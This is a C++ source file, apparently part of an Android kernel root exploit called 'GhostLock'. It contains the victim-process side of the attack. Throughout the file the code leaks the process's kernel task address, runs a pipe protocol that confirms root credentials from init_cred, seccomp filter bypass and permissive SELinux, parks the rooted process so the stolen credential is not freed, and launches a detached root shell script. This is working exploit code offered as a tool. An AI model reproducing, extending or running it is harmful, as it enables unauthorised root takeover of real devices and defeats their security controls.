/*
 * GhostLock — victim process protocol: spawn, command pipe loop, root handoff.
 *
 * Split out of main.cpp; the statement order and log text are unchanged.
 */

#include "session/victim_process.hpp"

#include "exploit_ops.hpp"

namespace ghostlock::victim {

/* rooted exits kfree the static init_cred (w2 stores it with no
 * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
/* Decoupling plan: retain a rooted child that references the credential.
 * Input: VictimContext policy; output: non-returning parked state. Future:
 * victim_park_rooted_child(const VictimContext *). */
static void park_child_process_forever(void) {
    FILE *f = fopen("/proc/self/oom_score_adj", "w");
    if (f) {
        fputs("-1000", f);
        fclose(f);
    }
    for (;;) pause();
}

/* Decoupling plan: execute the victim command protocol and root handoff.
 * Input: owned pipe endpoints plus runtime config; output: reports/child exit.
 * Future: victim_child_run(VictimContext *), with explicit fd ownership. */
static void child_main(VictimContext *p) {
    p->task_read.reset();
    p->cmd_write.reset();
    p->uid_read.reset();
    setpgid(0, 0);  /* own group; the parent kills the whole tree on timeout */
    fcntl(p->uid_write.get(), F_SETFD, FD_CLOEXEC);  /* keep the probe pipe out of the
                                          * root shell / ksud chain */
    prctl(PR_SET_NAME, "ghostleaf_0123456789");
    /* a real leak reproduces, a fluke vote winner does not. w2 writes to
     * this address, so two runs must agree or the leak is discarded. */
    uintptr_t my_task = ops::perf_find_task();
    int leak_agreed = 0;
    for (int i = 0; i < 2 && my_task; i++) {
        uintptr_t again = ops::perf_find_task();
        if (again == my_task) {
            leak_agreed = 1;
            break;
        }
        my_task = again;
    }
    if (!leak_agreed) my_task = 0;
    write(p->task_write.get(), &my_task, sizeof(my_task));
    p->task_write.reset();
    if (!my_task) _exit(1);
    char cmd;
    while (read(p->cmd_read.get(), &cmd, 1) == 1) {
        if (cmd == 'C') {
            uint32_t uid = getuid();
            write(p->uid_write.get(), &uid, sizeof(uid));
        } else if (cmd == 'F') {
            /* Forked finit_module probe after W3 cleared TIF_SECCOMP and
             * seccomp.mode: mode==2 re-arms TIF_SECCOMP on fork (probe hits the
             * filter); mode==0 lets it run filter-free to a normal errno. Forked
             * so SIGSYS costs only this. */
            uint32_t code = 0xffffffff;
            int probe_pipe[2];
            if (pipe(probe_pipe) == 0) {
                pid_t probe = fork();
                if (probe == 0) {
                    close(probe_pipe[0]);
                    /* Forked probe: keep default SIGSYS so the filter kills it. */
                    signal(SIGSYS, SIG_DFL);
                    errno = 0;
                    long r = syscall(__NR_finit_module, 0, 0, 0);
                    uint32_t out = (r == 0) ? 0 : (uint32_t) errno;
                    ssize_t nw = write(probe_pipe[1], &out, sizeof(out));
                    (void) nw;
                    _exit(0);
                }
                close(probe_pipe[1]);
                int st = 0;
                if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
                    ssize_t nr = read(probe_pipe[0], &code, sizeof(code));
                    if (nr != (ssize_t)sizeof(code)) code = 0xfffffffe;
                } else {
                    code = 0xfffffffd; /* probe killed by a signal (SIGSYS) */
                }
                close(probe_pipe[0]);
            }
            write(p->uid_write.get(), &code, sizeof(code));
        } else if (cmd == 'M') {
            /* Report comm length + first byte to tell which side a leaf=1 write
             * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
             * [target+8] len 8, untouched len 15. */
            char comm[24] = {0};
            FILE *cf = fopen("/proc/self/comm", "r");
            if (cf) {
                size_t n = fread(comm, 1, sizeof(comm) - 1, cf);
                (void) n;
                fclose(cf);
            }
            size_t len = strlen(comm);
            while (len > 0 && comm[len - 1] == '\n') {
                comm[len - 1] = 0;
                len--;
            }
            uint32_t report =
                    ((uint32_t) len << 8) | (uint32_t)(unsigned char)
            comm[0];
            write(p->uid_write.get(), &report, sizeof(report));
        } else if (cmd == 'P') {
            /* w2 rooted this task; park */
            p->cmd_read.reset();
            p->uid_write.reset();
            park_child_process_forever();
        } else if (cmd == 'G' || cmd == 'X') {
            pr_info("handoff: root script path=%s\n", (runtime_config_snapshot().root_script_path.c_str()));
            break;
        }
    }
    p->cmd_read.reset();
    if (getuid() != 0) {
        p->uid_write.reset();
        _exit(1);
    }
    /* Don't leak app-side fds into the root shell chain: ksud/zygisk
     * daemons must not keep their write ends open. */
    for (int fd = 3; fd < 1024; fd++) {
        int fl = fcntl(fd, F_GETFD);
        if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
    }
    /* Pin the path in a stack buffer before fork/exec. The RuntimeConfig path
     * is now std::string-owned; passing its heap pointer straight into execl()
     * failed with EFAULT at the kernel boundary even though userspace could
     * print it, so the exec path must travel in process-stable stack storage. */
    char script_path[320];
    snprintf(script_path, sizeof(script_path), "%s", (runtime_config_snapshot().root_script_path.c_str()));
    pid_t worker = fork();
    if (worker == 0) {
        /* Detach into a brand-new session: the independent root shell owns the
         * whole chain (ksud late-load + module watch) and must survive the
         * exploit parent killing this group on timeout. */
        if (setsid() < 0) _exit(1);
        errno = 0;
        const int probe = open(script_path, O_RDONLY | O_CLOEXEC);
        pr_info("handoff: script open fd=%d errno=%d path=%s\n", probe, errno,
                script_path);
        if (probe >= 0) close(probe);
        execl("/system/bin/sh", "sh", script_path, static_cast<char *>(nullptr));
        pr_warning("execl root script failed path=%s errno=%d\n",
                script_path, errno);
        _exit(1);
    }
    pr_info("handoff: root shell worker pid=%d\n", worker);
    if (worker < 0) {
        pr_warning("fork() for root shell failed errno=%d; parking rooted child\n", errno);
        p->uid_write.reset();
        park_child_process_forever();
    }
    /* the worker holds a fresh cred copy; this task holds the raw init_cred */
    p->uid_write.reset();
    park_child_process_forever();
}

/* Decoupling plan: create the victim process and pipe protocol. Input/output:
 * VictimContext; output: owned PID/error. Future: victim_context_spawn(). */
/* TODO(M02-SPAWN-RESULT): spawn_child/spawn_victim still return pid_t/int with
 * call-site errno checks instead of an explicit Result; tracked as an M02
 * maintenance item (no behaviour change, does not block other work). */
static pid_t spawn_child(VictimContext *p) {
    int p1[2], p2[2], p3[2];
    if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
    p->task_read.reset(p1[0]);
    p->task_write.reset(p1[1]);
    p->cmd_read.reset(p2[0]);
    p->cmd_write.reset(p2[1]);
    p->uid_read.reset(p3[0]);
    p->uid_write.reset(p3[1]);
    pid_t child = fork();
    if (child < 0) return -1;
    if (child == 0) {
        child_main(p);
        _exit(1);
    }
    p->task_write.reset();
    p->cmd_read.reset();
    p->uid_write.reset();
    p->set_child(child);
    return child;
}

/* Fork the victim and read back the task pointer perf leaked. */
/* Decoupling plan: spawn a victim and obtain its task address. Inputs:
 * VictimContext/output address; output: PID/error. Future:
 * victim_context_prepare(VictimContext *, uintptr_t *). */
pid_t spawn_victim(VictimContext *p, uintptr_t *task_out) {
    pid_t child = spawn_child(p);
    if (child < 0) return -1;
    uintptr_t task = 0;
    ssize_t nr = read(p->task_read.get(), &task, sizeof(task));
    p->task_read.reset();
    *task_out = (nr == (ssize_t)
    sizeof(task)) ? task :
    0;
    return child;
}

/* Decoupling plan: verify the SELinux stage. Input: verification context;
 * output: boolean/status. Future: stage_verify_selinux(const StageContext *). */
int verify_selinux_stage(void *context) {
    (void) context;
    if (!ops::check_selinux_off()) return 0;
    pr_success("SELinux permissive\n");
    return 1;
}

/* Decoupling plan: verify victim credentials through its protocol. Input:
 * W2 context; output: boolean/status. Future: stage_verify_credentials(). */
int verify_w2_stage(void *context) {
    auto *stage = static_cast<struct w2_stage_context *>(context);
    if (write(stage->pipes->cmd_write.get(), "C", 1) != 1) return 0;

    uint32_t child_uid = 9999;
    if (read(stage->pipes->uid_read.get(), &child_uid, sizeof(child_uid)) !=
            (ssize_t)
        sizeof(child_uid)) {
        return 0;
    }
    pr_info("child uid = %u\n", child_uid);
    if (child_uid != 0) return 0;
    pr_success("child is root!\n");
    return 1;
}

/* Decoupling plan: verify the victim seccomp stage. Input: victim context;
 * output: boolean/status. Future: stage_verify_seccomp(). */
int verify_seccomp_probe_stage(void *context) {
    auto *stage = static_cast<struct w2_stage_context *>(context);
    if (write(stage->pipes->cmd_write.get(), "F", 1) != 1) return 0;

    uint32_t code = 0;
    if (read(stage->pipes->uid_read.get(), &code, sizeof(code)) !=
            (ssize_t)
        sizeof(code)) {
        return 0;
    }
    pr_info("seccomp finit_module probe = 0x%x\n", code);
    /* SIGSYS (0xfffffffd) = filter kills; EPERM/ENOSYS = its RET_ERRNO actions.
     * With init_cred + permissive SELinux a real probe fails with a normal
     * errno instead. */
    if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
            code == 1 || code == 38) {
        return 0;
    }
    pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
    return 1;
}

/* Decoupling plan: determine select-stack leaf write direction. Input: W3
 * context; output: verified direction/status. Future:
 * select_stack_verify_leaf_direction(), storing result in its route context. */
int verify_leaf_dir_stage(void *context) {
    auto *stage = static_cast<struct w3_stage_context *>(context);
    if (write(stage->pipes->cmd_write.get(), "M", 1) != 1) return 0;

    uint32_t report = 0;
    if (read(stage->pipes->uid_read.get(), &report, sizeof(report)) !=
            (ssize_t)
        sizeof(report)) {
        return 0;
    }
    size_t len = (report >> 8) & 0xff;
    unsigned char c0 = (unsigned char) (report & 0xff);
    pr_info("leaf dir probe comm_len=%u comm[0]=%02x\n", (unsigned) len, c0);
    if (len == 8) {
        stage->leaf_to_target8 = 1;
        pr_info("leaf=1 write lands on [target+8]\n");
        return 1;
    }
    if (len == 0) {
        stage->leaf_to_target8 = 0;
        pr_info("leaf=1 write lands on [target]\n");
        return 1;
    }
    if (len == 15) {
        pr_warning("leaf dir probe: comm untouched (write missed the comm field)\n");
        return 0;
    }
    pr_warning("leaf dir probe ambiguous (len=%u c0=%02x)\n", (unsigned) len, c0);
    return 0;
}

}  // namespace ghostlock::victim
